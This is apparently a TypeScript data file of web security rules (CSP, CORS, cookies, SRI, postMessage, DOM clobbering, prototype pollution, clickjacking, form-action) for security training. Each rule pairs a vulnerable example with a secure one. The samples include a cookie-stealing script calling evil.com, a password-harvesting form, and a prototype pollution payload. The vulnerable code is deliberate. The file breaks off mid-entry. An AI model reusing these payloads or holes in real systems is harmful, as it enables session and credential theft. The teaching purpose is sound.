import { SecurityInvariant } from '../../types/invariants';

export const webRules: SecurityInvariant[] = [
  {
    ruleNumber: 37,
    id: "SEC-WEB-001",
    title: "CSP Script Execution Nonce/Hash Disjunction Invariant",
    domain: "web",
    domainName: "Web Security",
    subdomain: "Content Security Policy (CSP)",
    difficulty: "Intermediate",
    standardType: "Mandatory Standard",
    standards: ["W3C CSP Level 3", "OWASP Top 10 A03:2021", "CWE-79"],
    formalInvariant: "\u2200 s \u2208 ScriptElements, Executable(s) \u21d2 (Hash(s) \u2208 AllowedHashes \u2228 (Nonce(s) = CSP_Nonce_{Request} \u2227 IsCSPRNG(CSP_Nonce_{Request})))",
    symbolBreakdown: [
          {
                "symbol": "\u2200 s \u2208 ScriptElements",
                "meaning": "For every <script> block or dynamic script execution in the document"
          },
          {
                "symbol": "Executable(s)",
                "meaning": "Browser grants permission to execute script bytecode"
          },
          {
                "symbol": "Hash(s) \u2208 AllowedHashes",
                "meaning": "Cryptographic SHA-256/384/512 of script matches whitelist"
          },
          {
                "symbol": "Nonce(s) = CSP_Nonce_{Request}",
                "meaning": "Script carries a per-request cryptographically unique nonce attribute"
          },
          {
                "symbol": "IsCSPRNG(...)",
                "meaning": "Nonce was generated using a cryptographically secure pseudo-random number generator"
          }
    ],
    plainEnglish: "The browser must only execute scripts that either possess an exact cryptographic hash declared in the Content-Security-Policy header or present a unguessable, one-time cryptographic nonce generated per HTTP request. Unsafe-inline must never be trusted.",
    whyItMatters: "Content Security Policy is the primary browser-side barrier against Cross-Site Scripting (XSS). If unsafe-inline is permitted or nonces are reused/predictable, an attacker who injects `<script>` tags can execute arbitrary code, steal session tokens, and compromise client-side data.",
    vulnerableExample: {
          "language": "html/http",
          "code": "<!-- VULNERABLE: Insecure CSP allowing inline script execution -->\nContent-Security-Policy: default-src * 'unsafe-inline' 'unsafe-eval';\n\n<!-- Attacker injects this via reflected query parameter -->\n<script>fetch('https://evil.com/steal?c=' + document.cookie);</script>",
          "explanation": "'unsafe-inline' completely dismantles script execution protection, allowing any injected markup to run without restriction."
    },
    secureExample: {
          "language": "html/http",
          "code": "Content-Security-Policy: default-src 'self'; script-src 'nonce-dGhpcy1pcy1yYW5kb20=' 'strict-dynamic'; object-src 'none'; base-uri 'none';\n\n<!-- Legitimate application script -->\n<script nonce=\"dGhpcy1pcy1yYW5kb20=\" src=\"/assets/app.js\"></script>",
          "explanation": "Uses a cryptographically random, per-request nonce combined with strict-dynamic to authorize legitimate scripts while blocking injected tags."
    },
    howToTest: {
          "tools": [
                "csp-evaluator.withgoogle.com",
                "curl",
                "browser DevTools"
          ],
          "steps": [
                "Inspect CSP header returned on HTML documents.",
                "Attempt to inject `<script>alert(1)</script>` into page markup.",
                "Verify browser console logs a CSP violation report and blocks execution."
          ],
          "commandExample": "curl -sI https://target.com/ | grep -i \"content-security-policy\""
    },
    interviewChallenge: {
          "scenario": "You deploy a nonce-based CSP on a server-rendered React app. However, an attacker finds a DOM-based XSS where script tags are appended via jQuery or innerHTML.",
          "question": "Why does 'strict-dynamic' protect (or fail to protect) against dynamically generated scripts?",
          "hint": "What does strict-dynamic propagate to scripts created by a nonced script?",
          "sampleAnswer": "Under 'strict-dynamic', scripts already authorized by a valid nonce are allowed to dynamically create and append new <script> elements. If an attacker injects code into a library already loaded by a nonced script, that library can create new scripts. However, pure markup injection (like innerHTML = '<script>...') will still be blocked because the parser requires the valid per-request nonce attribute.",
          "keyTakeaway": "Combine nonce-based CSP with 'strict-dynamic' and deprecate unsafe-eval and DOM sinks."
    },
    simulation: {
          "type": "generic",
          "label": "CSP Directive Analyzer",
          "defaultInput": "script-src 'self' 'unsafe-inline' https://cdn.example.com",
          "testFunctionDescription": "Detects dangerous directives like 'unsafe-inline', 'unsafe-eval', or wildcard origins."
    }
  },
  {
    ruleNumber: 38,
    id: "SEC-WEB-002",
    title: "CORS Access-Control-Allow-Origin Wildcard with Credentials Prohibition",
    domain: "web",
    domainName: "Web Security",
    subdomain: "Cross-Origin Resource Sharing (CORS)",
    difficulty: "Beginner",
    standardType: "Mandatory Standard",
    standards: ["W3C CORS Specification", "Fetch Living Standard \u00a73.2", "CWE-346"],
    formalInvariant: "\u2200 resp \u2208 Responses, HasHeader(resp, \"Access-Control-Allow-Credentials: true\") \u21d2 (HeaderValue(resp, \"Access-Control-Allow-Origin\") \u2260 \"*\" \u2227 HeaderValue(resp, \"Access-Control-Allow-Origin\") \u2260 \"null\")",
    symbolBreakdown: [
          {
                "symbol": "Access-Control-Allow-Credentials: true",
                "meaning": "Server authorizes cross-origin requests with user credentials (cookies, auth headers)"
          },
          {
                "symbol": "\u2260 \"*\"",
                "meaning": "Allow-Origin must NEVER be a wildcard asterisk"
          },
          {
                "symbol": "\u2260 \"null\"",
                "meaning": "Allow-Origin must NEVER be the string \"null\" (which can be spoofed by sandboxed iframes)"
          }
    ],
    plainEnglish: "Whenever an API server returns Access-Control-Allow-Credentials: true, it must NEVER set Access-Control-Allow-Origin to \"*\" or \"null\". Furthermore, it must never blindly reflect the incoming Origin header without validating it against a trusted whitelist.",
    whyItMatters: "Blindly reflecting the Origin header with Allow-Credentials: true enables any malicious website visited by an authenticated user to perform credentialed background fetch calls and read private personal, financial, or medical data.",
    vulnerableExample: {
          "language": "javascript/node",
          "code": "// VULNERABLE: Blind origin reflection with credentials\napp.use((req, res, next) => {\n    // Blindly reflects whatever Origin the client sends:\n    res.header('Access-Control-Allow-Origin', req.headers.origin);\n    res.header('Access-Control-Allow-Credentials', 'true');\n    next();\n});",
          "explanation": "Allows any arbitrary site (https://evil-attacker.com) to read private API endpoints with victim cookies."
    },
    secureExample: {
          "language": "typescript/node",
          "code": "const TRUSTED_ORIGINS = new Set([\n    'https://dashboard.example.com',\n    'https://checkout.example.com'\n]);\n\napp.use((req, res, next) => {\n    const origin = req.headers.origin;\n    if (origin && TRUSTED_ORIGINS.has(origin)) {\n        res.header('Access-Control-Allow-Origin', origin);\n        res.header('Access-Control-Allow-Credentials', 'true');\n        res.header('Vary', 'Origin');\n    }\n    next();\n});",
          "explanation": "Validates against a predefined whitelist and emits Vary: Origin to prevent cache poisoning across origins."
    },
    howToTest: {
          "tools": [
                "curl",
                "Postman"
          ],
          "steps": [
                "Send curl request with header: Origin: https://evil.attacker.com.",
                "Verify response does NOT contain Access-Control-Allow-Origin: https://evil.attacker.com or does NOT include credentials.",
                "Verify that Vary: Origin is present whenever Allow-Origin is dynamically set."
          ],
          "commandExample": "curl -H \"Origin: https://malicious.org\" -sI https://api.target.com/user/profile | grep -i access-control"
    },
    interviewChallenge: {
          "scenario": "A developer implements regex validation for CORS: `if (origin.match(/example\\.com$/)) { allow(origin); }`.",
          "question": "How can an attacker bypass this regex to steal authenticated data?",
          "hint": "Does the regex check the protocol or enforce boundary dots?",
          "sampleAnswer": "An attacker registers `evilexample.com` or `attacker-example.com`. Because the unanchored regex only checks that the string ends with `example.com`, `https://attacker-example.com` will match successfully, bypassing the check and enabling full credentialed cross-origin read access.",
          "keyTakeaway": "Always validate origins by parsing them with standard URL parsers and matching exact hostnames against a set."
    },
    simulation: {
          "type": "cors",
          "label": "CORS Origin Reflector Validator",
          "defaultInput": "Origin: https://attacker-site.com\nRequested-Path: /api/v1/bank-balance",
          "testFunctionDescription": "Tests if origin is validated against trusted set or improperly reflected."
    }
  },
  {
    ruleNumber: 39,
    id: "SEC-WEB-003",
    title: "Session Cookie Triple-Flag Invariant (HttpOnly + Secure + SameSite)",
    domain: "web",
    domainName: "Web Security",
    subdomain: "Cookie Security & State Management",
    difficulty: "Beginner",
    standardType: "Mandatory Standard",
    standards: ["RFC 6265bis \u00a75.4", "OWASP ASVS 4.0 \u00a73.4", "CWE-1004"],
    formalInvariant: "\u2200 c \u2208 Cookies_{Session}, HasFlag(c, \"HttpOnly\") \u2227 HasFlag(c, \"Secure\") \u2227 FlagValue(c, \"SameSite\") \u2208 {\"Strict\", \"Lax\"}",
    symbolBreakdown: [
          {
                "symbol": "Cookies_{Session}",
                "meaning": "Any HTTP cookie that stores session keys, auth tokens, or privilege claims"
          },
          {
                "symbol": "HasFlag(c, \"HttpOnly\")",
                "meaning": "JavaScript document.cookie access is completely disabled by the browser"
          },
          {
                "symbol": "HasFlag(c, \"Secure\")",
                "meaning": "Browser only transmits cookie over authenticated HTTPS connections"
          },
          {
                "symbol": "FlagValue(c, \"SameSite\")",
                "meaning": "Must be explicitly set to Strict or Lax, never None"
          }
    ],
    plainEnglish: "All authentication and session cookies must include the HttpOnly, Secure, and SameSite (Strict or Lax) attributes. They should also use the __Host- prefix whenever possible.",
    whyItMatters: "Missing HttpOnly allows any XSS vulnerability to immediately exfiltrate session tokens. Missing Secure allows cookies to be intercepted over plaintext Wi-Fi. Missing SameSite allows Cross-Site Request Forgery (CSRF).",
    vulnerableExample: {
          "language": "http",
          "code": "# VULNERABLE: Naked session cookie\nSet-Cookie: session_id=abc123xyz; Path=/",
          "explanation": "Exposes session cookie to JavaScript access (XSS exfiltration), cleartext transmission, and cross-site CSRF."
    },
    secureExample: {
          "language": "http",
          "code": "# SECURE: Hardened session cookie with __Host- prefix\nSet-Cookie: __Host-session=abc123xyz; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=3600",
          "explanation": "__Host- prefix locks cookie to origin without subdomain overriding, and flags block XSS and CSRF."
    },
    howToTest: {
          "tools": [
                "curl",
                "browser DevTools Storage tab"
          ],
          "steps": [
                "Perform login flow and capture Set-Cookie response header.",
                "Verify HttpOnly, Secure, and SameSite=Lax/Strict are present.",
                "Inspect document.cookie in browser console to confirm the token is invisible to scripts."
          ],
          "commandExample": "curl -sI https://target.com/api/login | grep -i set-cookie"
    },
    interviewChallenge: {
          "scenario": "A company switches all session cookies to SameSite=Lax. The security team claims CSRF is now 100% eradicated.",
          "question": "Is CSRF completely eliminated by SameSite=Lax alone? What residual attack vectors remain?",
          "hint": "What kind of top-level navigations send Lax cookies?",
          "sampleAnswer": "No. SameSite=Lax still transmits cookies on top-level GET navigations (e.g. clicking a link or window.location redirect). If any state-modifying action can be triggered via GET, or if there is an open redirect or HTTP method override, CSRF is still possible. State-changing actions should also require explicit anti-CSRF tokens or custom headers.",
          "keyTakeaway": "SameSite=Lax is defense-in-depth; state mutations must require non-safe methods (POST/PUT) and explicit verification tokens."
    }
  },
  {
    ruleNumber: 40,
    id: "SEC-WEB-004",
    title: "Subresource Integrity (SRI) Hash Matching Invariant",
    domain: "web",
    domainName: "Web Security",
    subdomain: "Supply Chain & Third-Party CDNs",
    difficulty: "Intermediate",
    standardType: "Mandatory Standard",
    standards: ["W3C SRI Specification", "OWASP ASVS 4.0 \u00a714.2.4", "CWE-353"],
    formalInvariant: "\u2200 res \u2208 ExternalScripts \u222a ExternalStyles, HasAttr(res, \"integrity\") \u2227 Hash(Bytes(res)) = Value(integrity) \u2227 HasAttr(res, \"crossorigin\", \"anonymous\")",
    symbolBreakdown: [
          {
                "symbol": "ExternalScripts \u222a ExternalStyles",
                "meaning": "Any third-party script or stylesheet loaded from an external CDN"
          },
          {
                "symbol": "HasAttr(res, \"integrity\")",
                "meaning": "Element includes an integrity attribute containing base64 SHA-384/512"
          },
          {
                "symbol": "Hash(Bytes(res)) = Value(...)",
                "meaning": "Browser verifies downloaded payload against cryptographic digest before execution"
          }
    ],
    plainEnglish: "Whenever loading external scripts or styles from third-party CDNs, HTML tags must specify the integrity attribute containing the cryptographic hash and crossorigin=\"anonymous\". If the file is modified on the CDN, the browser must refuse execution.",
    whyItMatters: "If an attacker compromises a third-party CDN or performs DNS/BGP hijacking, they can inject malicious code (Magecart attacks, keyloggers) into all websites loading the resource. SRI guarantees that modified scripts are rejected immediately.",
    vulnerableExample: {
          "language": "html",
          "code": "<!-- VULNERABLE: Loading external script without integrity verification -->\n<script src=\"https://cdn.example.org/analytics/v2.1.js\"></script>",
          "explanation": "If cdn.example.org is breached, malicious code executes directly on all customer portals."
    },
    secureExample: {
          "language": "html",
          "code": "<!-- SECURE: SRI hash locks script execution to verified digest -->\n<script src=\"https://cdn.example.org/analytics/v2.1.js\"\n        integrity=\"sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC\"\n        crossorigin=\"anonymous\"></script>",
          "explanation": "The browser computes the SHA-384 hash of the file; if a single byte differs, execution is terminated."
    },
    howToTest: {
          "tools": [
                "curl",
                "shasum",
                "browser DevTools"
          ],
          "steps": [
                "Compute hash: curl -s https://cdn.example.org/lib.js | openssl dgst -sha384 -binary | openssl base64 -A.",
                "Alter one character in the local script and verify the browser throws a subresource integrity error in console."
          ],
          "commandExample": "curl -s https://cdnjs.cloudflare.com/ajax/libs/react/18.2.0/umd/react.production.min.js | openssl dgst -sha384 -binary | openssl base64 -A"
    },
    interviewChallenge: {
          "scenario": "You enforce SRI across all CDN assets. A third-party SaaS provider updates their analytics library dynamically without changing the URL.",
          "question": "What happens to the web app, and how should enterprise applications consume third-party dependencies?",
          "hint": "The hash of the remote file will change, but your HTML still has the old hash.",
          "sampleAnswer": "The browser refuses to load the script because the hash no longer matches, breaking the analytics feature. Enterprise applications should self-host dependencies or pin third-party assets to immutable versioned URLs inside a controlled artifact registry or build pipeline.",
          "keyTakeaway": "Third-party code should be vendored or pinned to immutable versions; never load floating unversioned scripts from third parties."
    }
  },
  {
    ruleNumber: 41,
    id: "SEC-WEB-005",
    title: "PostMessage Origin Verification Invariant",
    domain: "web",
    domainName: "Web Security",
    subdomain: "Cross-Window Messaging & Iframes",
    difficulty: "Intermediate",
    standardType: "Mandatory Standard",
    standards: ["HTML Living Standard \u00a79.4.3", "OWASP ASVS \u00a713.3.1", "CWE-345"],
    formalInvariant: "\u2200 msg \u2208 PostMessageEvents, (TargetOrigin(msg) \u2260 \"*\") \u2227 (SenderOrigin(msg) \u2208 TrustedOrigins)",
    symbolBreakdown: [
          {
                "symbol": "TargetOrigin(msg) \u2260 \"*\"",
                "meaning": "postMessage must explicitly target a specific origin, never the wildcard \"*\""
          },
          {
                "symbol": "SenderOrigin(msg) \u2208 TrustedOrigins",
                "meaning": "The message event listener must check event.origin against an immutable whitelist before processing data"
          }
    ],
    plainEnglish: "When sending messages with window.postMessage, never specify \"*\" as the targetOrigin. When receiving messages via window.addEventListener(\"message\"), always verify event.origin against a trusted allowlist before inspecting event.data.",
    whyItMatters: "Specifying \"*\" when sending messages broadcasts sensitive payload tokens to any site that can frame or be opened by the window. Failing to verify event.origin allows malicious iframes to send forged commands or exploit DOM XSS.",
    vulnerableExample: {
          "language": "javascript",
          "code": "// VULNERABLE: Sending with wildcard target\ntargetWindow.postMessage({ authToken: userToken }, '*');\n\n// VULNERABLE: Receiving without origin check\nwindow.addEventListener('message', (event) => {\n    // Blindly trusts message data from any origin!\n    document.getElementById('profile').innerHTML = event.data.html;\n});",
          "explanation": "Wildcard target leaks auth token; missing origin validation creates an immediate DOM XSS sink."
    },
    secureExample: {
          "language": "javascript",
          "code": "// SECURE: Specific target origin\ntargetWindow.postMessage({ authToken: userToken }, 'https://trusted-partner.com');\n\n// SECURE: Strict origin validation on receiver\nwindow.addEventListener('message', (event) => {\n    if (event.origin !== 'https://trusted-partner.com') {\n        return; // Reject untrusted message\n    }\n    // Safely handle typed data without innerHTML\n    displayProfile(event.data.name);\n});",
          "explanation": "Target is constrained to the verified partner domain, and receiver filters all messages from unexpected origins."
    },
    howToTest: {
          "tools": [
                "browser DevTools",
                "PostMessage fuzzer"
          ],
          "steps": [
                "Open an iframe pointing to attacker.com and dispatch a postMessage to parent.",
                "Verify parent drops message with no state mutation or console errors."
          ],
          "commandExample": "window.postMessage({cmd: \"transfer\"}, \"*\")"
    },
    interviewChallenge: {
          "scenario": "A developer uses `event.origin.includes(\"partner.com\")` in a message event handler.",
          "question": "Identify the flaw and provide an exploit origin.",
          "hint": "Can an attacker register a domain that includes the string?",
          "sampleAnswer": "The string method includes() matches anywhere inside the origin string. An attacker can register `https://partner.com.evil.org` or `https://maliciouspartner.com`. Both pass the check. Always use strict equality (`===`) against a known origin string or parse into a URL object.",
          "keyTakeaway": "Never use regex or substring matching on origin strings; use exact literal equality."
    }
  },
  {
    ruleNumber: 42,
    id: "SEC-WEB-042",
    title: "DOM Clobbering Property Shadowing Invariant",
    domain: "web",
    domainName: "Web Security",
    subdomain: "DOM Security",
    difficulty: "Advanced",
    standardType: "Mandatory Standard",
    standards: ["W3C DOM Living Standard", "OWASP Top 10:2021", "CWE-79"],
    formalInvariant: "\u2200 elem \u2208 DocumentDOM, elem.id \u2209 WindowGlobalProperties \u2227 elem.name \u2209 FormControlsShadow",
    symbolBreakdown: [
          {
                "symbol": "DocumentDOM",
                "meaning": "All DOM nodes in current HTML document"
          },
          {
                "symbol": "WindowGlobalProperties",
                "meaning": "Global JavaScript window properties like config, api, or router"
          },
          {
                "symbol": "FormControlsShadow",
                "meaning": "Shadowing of form.elements by named inputs"
          }
    ],
    plainEnglish: "HTML element IDs and names must never override global window properties or DOM collection properties. Applications must reference global variables via window.property explicitly or freeze property descriptors.",
    whyItMatters: "Attacker markup like `<a id='config' href='https://attacker.com'>` overrides `window.config` in JavaScript. If code accesses `config.apiUrl`, it unexpectedly reads the attacker's anchor tag href, resulting in XSS or data theft.",
    vulnerableExample: {
          "language": "javascript",
          "code": "// VULNERABLE: Unprefixed global lookup clobbered by HTML\nconst endpoint = window.config?.apiEndpoint || '/api/default';\n// If DOM has: <img id='config' src='x' name='apiEndpoint'>\nfetch(endpoint);",
          "explanation": "Attacker injects an HTML tag whose id shadows window.config, hijacking API requests."
    },
    secureExample: {
          "language": "javascript",
          "code": "// SECURE: Explicit object validation and freeze\nconst config = Object.freeze({\n    apiEndpoint: 'https://api.example.com'\n});\n// Always read from sealed reference, never raw window\nfetch(config.apiEndpoint);",
          "explanation": "Freezes configuration in an immutable lexical scope immune to DOM name-shadowing."
    },
    howToTest: {
          "tools": [
                "DOMPurify with SANITIZE_DOM",
                "browser DevTools"
          ],
          "steps": [
                "Inject `<form id='x'></form>` and test if window.x resolves to the element.",
                "Ensure JavaScript looks up variables via lexical scope or explicit Map/Set."
          ],
          "commandExample": "DOMPurify.sanitize(dirty, {SANITIZE_DOM: true})"
    },
    interviewChallenge: {
          "scenario": "An enterprise app checks `if (window.isAdmin) { showAdminControls(); }`. An attacker injects `<img name='isAdmin'>` via rich-text comment.",
          "question": "Explain how DOM Clobbering turns an image tag into a truthy value in the check.",
          "hint": "In JavaScript, document elements with name or id are automatically bound to the window object as HTMLCollection or HTMLElement instances, which are truthy.",
          "sampleAnswer": "In the browser's legacy named access on window (HTML spec \u00a77.3.3), named elements are exposed as properties on window. Because any object in JavaScript is truthy (`Boolean(window.isAdmin) === true`), the check passes.",
          "keyTakeaway": "Never use naked global checks; store security flags in closures or use strict boolean type checks (`=== true`)."
    }
  },
  {
    ruleNumber: 43,
    id: "SEC-WEB-043",
    title: "Prototype Pollution Object Freezing and Null Prototype Invariant",
    domain: "web",
    domainName: "Web Security",
    subdomain: "Client Runtime Hardening",
    difficulty: "Intermediate",
    standardType: "Defense-in-Depth",
    standards: ["CWE-1321", "OWASP Top 10:2021", "CWE-79"],
    formalInvariant: "\u2200 obj \u2208 ParsedJSON, HasKey(obj, \"__proto__\") \u2228 HasKey(obj, \"constructor.prototype\") \u21d2 REJECT(obj)",
    symbolBreakdown: [
          {
                "symbol": "ParsedJSON",
                "meaning": "Objects created via JSON parsing or recursive object merge"
          },
          {
                "symbol": "__proto__",
                "meaning": "Object prototype reference property"
          },
          {
                "symbol": "REJECT(obj)",
                "meaning": "Throw error or strip forbidden keys before deep merge"
          }
    ],
    plainEnglish: "Recursive object assignment and merging must reject or strip `__proto__`, `constructor`, and `prototype` keys. Dynamic lookup dictionaries should use `Object.create(null)` to prevent prototype tampering.",
    whyItMatters: "Polluting `Object.prototype` injects properties into EVERY object in the runtime. Attackers exploit this to set default administrative flags, override template compiler options, or achieve remote code execution in NodeJS.",
    vulnerableExample: {
          "language": "javascript",
          "code": "// VULNERABLE: Naive recursive merge\nfunction deepMerge(target, source) {\n    for (let key in source) {\n        if (typeof source[key] === 'object') {\n            deepMerge(target[key] = target[key] || {}, source[key]);\n        } else {\n            target[key] = source[key];\n        }\n    }\n    return target;\n}",
          "explanation": "Payload `{\"__proto__\": {\"isAdmin\": true}}` alters Object.prototype, making every object in the app report isAdmin=true."
    },
    secureExample: {
          "language": "javascript",
          "code": "// SECURE: Key filtering and null-prototype map\nfunction safeMerge(target, source) {\n    for (let key of Object.keys(source)) {\n        if (key === '__proto__' || key === 'constructor' || key === 'prototype') {\n            continue; // Strip pollution keys\n        }\n        if (typeof source[key] === 'object' && source[key] !== null) {\n            target[key] = safeMerge(target[key] || {}, source[key]);\n        } else {\n            target[key] = source[key];\n        }\n    }\n    return target;\n}",
          "explanation": "Explicitly rejects prototype properties and freezes prototype chains against modification."
    },
    howToTest: {
          "tools": [
                "npm audit",
                "semgrep",
                "Mocha unit test"
          ],
          "steps": [
                "Fuzz merge function with `{\"__proto__\": {\"polluted\": true}}`.",
                "Assert `({}).polluted === undefined` after merge."
          ],
          "commandExample": "node -e 'const m = require(\"./merge\"); m({}, JSON.parse(\"{\\\"__proto__\\\":{\\\"p\\\":1}}\")); console.assert(!({}).p)'"
    },
    interviewChallenge: {
          "scenario": "An application runs `Object.freeze(Object.prototype)` at startup. What potential breakages and what security benefits arise?",
          "question": "Can freezing Object.prototype cause third-party library regressions?",
          "hint": "Some libraries dynamically add polyfills or methods to prototype at runtime.",
          "sampleAnswer": "Freezing Object.prototype completely prevents property pollution because attempts to mutate it throw a TypeError in strict mode. However, poorly written third-party polyfills or libraries that monkey-patch prototypes will crash.",
          "keyTakeaway": "Use `Object.freeze(Object.prototype)` in high-security apps after all imports, or validate recursive merges with Zod/Ajv."
    }
  },
  {
    ruleNumber: 44,
    id: "SEC-WEB-044",
    title: "Trusted Types HTML Sink Policy Invariant",
    domain: "web",
    domainName: "Web Security",
    subdomain: "DOM XSS Prevention",
    difficulty: "Advanced",
    standardType: "Mandatory Standard",
    standards: ["W3C Trusted Types", "OWASP Top 10:2021", "CWE-79"],
    formalInvariant: "\u2200 sink \u2208 DOMEvaluationSinks, IsString(sink.input) \u21d2 BlockExecution(sink) \u2227 sink.input \u2208 TrustedHTML",
    symbolBreakdown: [
          {
                "symbol": "DOMEvaluationSinks",
                "meaning": "Dangerous DOM sinks like element.innerHTML, outerHTML, or document.write"
          },
          {
                "symbol": "IsString(sink.input)",
                "meaning": "Passing raw primitive string to DOM sink"
          },
          {
                "symbol": "TrustedHTML",
                "meaning": "Type-safe sanitized wrapper created by an audited Trusted Types policy"
          }
    ],
    plainEnglish: "Browsers supporting Trusted Types must enforce policies where raw string assignment to DOM sinks (innerHTML, script.src) is rejected at runtime. Only objects produced by an authorized TrustedTypePolicy are accepted.",
    whyItMatters: "Developers accidentally write `element.innerHTML = userInput`. Without Trusted Types, this causes DOM-based XSS. Trusted Types converts these accidents into fatal browser exceptions before any code runs.",
    vulnerableExample: {
          "language": "javascript",
          "code": "// VULNERABLE: Direct string assignment to sink\nelement.innerHTML = '<p>' + untrustedSearchQuery + '</p>';",
          "explanation": "Directly binds untrusted string into HTML DOM parser, enabling script execution."
    },
    secureExample: {
          "language": "javascript",
          "code": "// SECURE: Enforce Trusted Types policy\nconst sanitizePolicy = trustedTypes.createPolicy('mySanitizer', {\n    createHTML: (string) => DOMPurify.sanitize(string, {RETURN_TRUSTED_TYPE: true})\n});\nelement.innerHTML = sanitizePolicy.createHTML(untrustedSearchQuery);",
          "explanation": "Requires all HTML passed to DOM sinks to be verified through the audited sanitizer policy."
    },
    howToTest: {
          "tools": [
                "Chrome DevTools Console",
                "CSP header validator"
          ],
          "steps": [
                "Set header: `Content-Security-Policy: require-trusted-types-for 'script'`.",
                "Attempt raw string assignment to innerHTML; verify browser throws TypeError."
          ],
          "commandExample": "curl -sI https://app.example.com | grep -i require-trusted-types-for"
    },
    interviewChallenge: {
          "scenario": "How does Trusted Types simplify the application security code review process?",
          "question": "How many DOM sinks must auditors inspect when Trusted Types is turned on?",
          "hint": "Instead of auditing thousands of `innerHTML` calls across a codebase, auditors only need to inspect the policy creation functions.",
          "sampleAnswer": "Trusted Types centralizes security risk: auditors only need to review the small number of `trustedTypes.createPolicy()` declarations where raw HTML is synthesized. Every other assignment in the entire application is guaranteed type-safe by the browser engine.",
          "keyTakeaway": "Enforce `require-trusted-types-for 'script'` in CSP to shift DOM XSS defense from developer vigilance to compiler/runtime enforcement."
    }
  },
  {
    ruleNumber: 45,
    id: "SEC-WEB-045",
    title: "Clickjacking Frame-Ancestors CSP Enforcement Invariant",
    domain: "web",
    domainName: "Web Security",
    subdomain: "Clickjacking & Framing",
    difficulty: "Beginner",
    standardType: "Defense-in-Depth",
    standards: ["W3C CSP Level 3", "OWASP Top 10:2021", "CWE-79"],
    formalInvariant: "\u2200 frame \u2208 WindowTree, Ancestor(frame) \u2209 CSP(frame-ancestors) \u21d2 DenyRendering(frame)",
    symbolBreakdown: [
          {
                "symbol": "WindowTree",
                "meaning": "All parent and ancestor framing contexts of current document"
          },
          {
                "symbol": "CSP(frame-ancestors)",
                "meaning": "Explicit list of allowed framing origins in Content-Security-Policy"
          },
          {
                "symbol": "DenyRendering",
                "meaning": "Browser blocks framing with an error and refuses to display UI"
          }
    ],
    plainEnglish: "All authenticated web pages must set `Content-Security-Policy: frame-ancestors 'none'` (or specific trusted partner domains). The obsolete `X-Frame-Options` header should only be maintained as legacy fallback.",
    whyItMatters: "Without frame-ancestors, an attacker can embed the victim's banking portal inside a transparent iframe on an attacker site, tricking the user into clicking transfer buttons while thinking they are clicking a game or survey.",
    vulnerableExample: {
          "language": "html",
          "code": "<!-- VULNERABLE: No frame-ancestors directive configured -->\nHTTP/1.1 200 OK\nContent-Type: text/html\n\n<body><button onclick=\"deleteAccount()\">Delete</button></body>",
          "explanation": "Allows any malicious website to render this view inside an iframe and trick user clicks."
    },
    secureExample: {
          "language": "html",
          "code": "<!-- SECURE: Strict framing prevention -->\nContent-Security-Policy: frame-ancestors 'none';\nX-Frame-Options: DENY\n\n<body><button onclick=\"deleteAccount()\">Delete</button></body>",
          "explanation": "Instructs modern browsers to immediately refuse iframe embedding from any ancestor origin."
    },
    howToTest: {
          "tools": [
                "curl",
                "clickjacking-tester",
                "Burp Suite Clickbandit"
          ],
          "steps": [
                "Create an HTML file with `<iframe src='https://target.com'></iframe>`.",
                "Open in browser; verify iframe fails to load with CSP frame-ancestors error."
          ],
          "commandExample": "curl -sI https://target.com | grep -i frame-ancestors"
    },
    interviewChallenge: {
          "scenario": "Why is `frame-ancestors` in CSP Level 3 strictly superior to the legacy `X-Frame-Options: ALLOW-FROM` header?",
          "question": "How do browsers handle multiple ancestor frames?",
          "hint": "X-Frame-Options only checks the top-level window, whereas frame-ancestors checks all nested framing ancestors and supports multiple domains.",
          "sampleAnswer": "X-Frame-Options ALLOW-FROM is deprecated and unsupported in modern browsers (Chrome/Safari). Furthermore, X-Frame-Options only checks the immediate parent, allowing framing bypasses in nested iframe chains (`SiteA -> AttackerSite -> Target`). CSP `frame-ancestors` validates every ancestor in the window tree.",
          "keyTakeaway": "Always use `frame-ancestors 'none'` or explicit domain whitelists in Content-Security-Policy."
    }
  },
  {
    ruleNumber: 46,
    id: "SEC-WEB-046",
    title: "Form-Action Restricted Submission Invariant",
    domain: "web",
    domainName: "Web Security",
    subdomain: "Form Hijacking",
    difficulty: "Beginner",
    standardType: "Mandatory Standard",
    standards: ["W3C CSP Level 3", "OWASP Top 10:2021", "CWE-79"],
    formalInvariant: "\u2200 form \u2208 DocumentDOM, form.action \u2208 CSP(form-action) \u2228 BlockSubmission(form)",
    symbolBreakdown: [
          {
                "symbol": "DocumentDOM",
                "meaning": "All HTML <form> elements in the page"
          },
          {
                "symbol": "CSP(form-action)",
                "meaning": "Approved destination origins and paths defined in CSP directive"
          },
          {
                "symbol": "BlockSubmission",
                "meaning": "Browser refuses to dispatch HTTP POST/GET request on submit"
          }
    ],
    plainEnglish: "Content-Security-Policy must include the `form-action` directive to restrict where HTML forms can submit credentials and sensitive data. Wildcards ('*') or omitted form-action directives are prohibited.",
    whyItMatters: "If an attacker finds an HTML injection vulnerability (even without script execution), they can inject an `<input type='hidden'>` or alter `<form action='https://attacker.com/steal'>`, exfiltrating passwords when the user presses Enter.",
    vulnerableExample: {
          "language": "html",
          "code": "<!-- VULNERABLE: Missing form-action directive in CSP -->\nContent-Security-Policy: default-src 'self';\n\n<!-- Attacker injects fake form tag -->\n<form action=\"https://evil-harvest.com/login\" method=\"POST\">\n<input name=\"password\" type=\"password\">\n<button type=\"submit\">Log In</button>",
          "explanation": "Submits passwords directly to external attacker server because form-action does not inherit from default-src."
    },
    secureExample: {
          "language": "html",
          "code": "<!-- SECURE: Explicit form-action lockdown -->\nContent-Security-Policy: default-src 'self'; form-action 'self' https://auth.example.com;\n\n<form action=\"/login\" method=\"POST\">\n<input name=\"password\" type=\"password\">\n<button type=\"submit\">Log In</button>\n</form>",
          "explanation": "Browser blocks form submission if the action attribute points anywhere outside approved origins."
    },
    howToTest: {
          "tools": [
                "browser DevTools",
                "curl"
          ],
          "steps": [
                "Set CSP with `form-action 'self'`.",
                "Dynamically change form.action to `https://evil.com` and trigger submit(); verify browser blocks request."
          ],
          "commandExample": "curl -sI https://target.com/login | grep -i \"form-action\""
    },
    interviewChallenge: {
          "scenario": "Does the `default-src` directive in CSP serve as a fallback if `form-action` is not explicitly declared?",
          "question": "Which directives in CSP do NOT fallback to default-src?",
          "hint": "Directives like `form-action`, `frame-ancestors`, `base-uri`, and `report-to` do NOT fallback to default-src.",
